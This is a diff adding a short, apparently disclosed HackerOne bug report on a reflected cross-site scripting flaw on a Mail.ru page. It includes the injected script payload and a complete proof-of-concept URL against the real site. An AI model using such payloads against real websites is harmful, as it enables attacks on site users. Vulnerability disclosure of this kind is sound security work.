@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/47322
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ddworken
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:22.03.2015 11:45:00
+
+Summary:
+
+On the cfire.mail.ru/screen/1/ page, the following HTML is generated:
+``` html
+<link rel="canonical" href="//cfire.mail.ru/screen/1/">
+```
+
+By appending "><script>alert(0)</script> to the end of the URL, an XSS vulnerability is triggered causing the javascript code: ``` alert(0) ``` to execute. 
+
+So the final URL to trigger this vulnerability is: 
+
+```https://cfire.mail.ru/screen/1/%22%3E%3Cscript%3Ealert(0)%3C/script%3E```
+
+Note that the page does not matter, this vulnerability will also be triggered when 1 is replaced with 2,3,etc.
